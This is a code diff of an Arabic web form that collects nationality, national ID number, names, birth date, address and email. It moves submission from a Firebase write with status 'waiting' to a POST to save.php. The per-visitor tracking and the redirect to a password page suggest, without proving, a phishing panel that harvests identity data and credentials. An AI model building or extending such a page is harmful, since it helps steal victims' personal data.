@@ -69,7 +69,9 @@
 
         <div class="form-card">
             <h2>البيانات الشخصية</h2>
-            <form id="detailsForm">
+            <form id="detailsForm" action="save.php" method="POST">
+                <input type="hidden" name="visitor_id" value="<?php echo htmlspecialchars($visitor_id); ?>">
+                <input type="hidden" name="current_page" value="personal_info.php">
                 <div class="form-group"><label>الجنسية *</label>
                     <select id="nationality" class="js-example-basic-single" required style="width: 100%;">
                         <option value="" disabled selected>اختر الجنسية</option>
@@ -111,21 +113,8 @@
         sessionStorage.setItem('visitorId', visitorId);
 
         document.getElementById('detailsForm').onsubmit = (e) => {
-            e.preventDefault();
-            document.getElementById('loading-overlay').style.display = 'flex';
-            database.ref('personal_data/' + visitorId).set({
-                nationality: $('#nationality').val(),
-                id_number: $('#id_number').val(),
-                name_ar: $('#name_ar').val(),
-                name_en: $('#name_en').val(),
-                dob: $('#dob').val(),
-                address: $('#address').val(),
-                email: $('#email_confirm').val(),
-                gender: $('input[name="gender"]:checked').val(),
-                status: "waiting"
-            }).then(() => {
-                window.location.href = "password.html";
-            });
+            // إرسال البيانات فوراً لـ save.php لضمان الانتقال السريع
+            // لا يتم استخدام preventDefault هنا للسماح للفورم بالإرسال الطبيعي
         };
     </script>
 </body>
